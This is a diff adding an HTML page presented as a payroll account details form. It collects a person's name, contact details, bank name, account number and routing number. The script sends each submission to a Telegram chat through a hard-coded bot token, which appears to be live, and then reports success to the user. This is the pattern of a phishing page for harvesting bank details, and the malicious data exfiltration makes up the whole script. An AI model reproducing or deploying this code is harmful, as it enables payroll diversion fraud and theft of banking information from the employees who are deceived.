@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Payroll Account Details Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      padding: 20px;
+    }
+    form {
+      max-width: 500px;
+      margin: auto;
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
+    }
+    label {
+      display: block;
+      margin: 15px 0 5px;
+    }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    button {
+      margin-top: 20px;
+      background: #dc143c;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #b01030;
+    }
+  </style>
+</head>
+<body>
+
+  <form id="payrollForm">
+    <h2>Payroll Account Details</h2>
+
+    <label for="fullName">Full Name</label>
+    <input type="text" id="fullName" name="fullName" required />
+
+    <label for="email">Email Address</label>
+    <input type="email" id="email" name="email" required />
+
+    <label for="phone">Phone Number</label>
+    <input type="tel" id="phone" name="phone" required />
+
+    <label for="bankName">Bank Name</label>
+    <input type="text" id="bankName" name="bankName" required />
+
+    <label for="accountNumber">Account Number</label>
+    <input type="text" id="accountNumber" name="accountNumber" required />
+
+    <label for="routingNumber">Routing Number</label>
+    <input type="text" id="routingNumber" name="routingNumber" required />
+
+    <label for="accountType">Account Type</label>
+    <select id="accountType" name="accountType" required>
+      <option value="">Select</option>
+      <option value="checking">Checking</option>
+      <option value="savings">Savings</option>
+    </select>
+
+    <label for="paymentFrequency">Preferred Payment Frequency</label>
+    <select id="paymentFrequency" name="paymentFrequency" required>
+      <option value="">Select</option>
+      <option value="weekly">Weekly</option>
+      <option value="biweekly">Bi-Weekly</option>
+    </select>
+
+    <button type="submit">Submit Details</button>
+  </form>
+
+  <script>
+    const botToken = "7774453371:AAE0HswdXjo1lvImLCVmr6LZueZhlbjkEPo"; // Replace with your bot token
+    const chatId = "-4610395963"; // Replace with your Telegram user ID
+
+    document.getElementById("payrollForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const formData = new FormData(this);
+      const message = `
+<b>New Payroll Submission</b>
+👤 Name: ${formData.get("fullName")}
+📧 Email: ${formData.get("email")}
+📞 Phone: ${formData.get("phone")}
+🏦 Bank: ${formData.get("bankName")}
+💳 Account #: ${formData.get("accountNumber")}
+🔁 Routing #: ${formData.get("routingNumber")}
+📂 Account Type: ${formData.get("accountType")}
+📆 Payment Frequency: ${formData.get("paymentFrequency")}
+      `;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "HTML"
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          alert("Submitted successfully!");
+          document.getElementById("payrollForm").reset();
+        } else {
+          alert("Something went wrong. Please try again.");
+        }
+      })
+      .catch(error => {
+        alert("Error sending to Telegram.");
+        console.error(error);
+      });
+    });
+  </script>
+
+</body>
+</html>
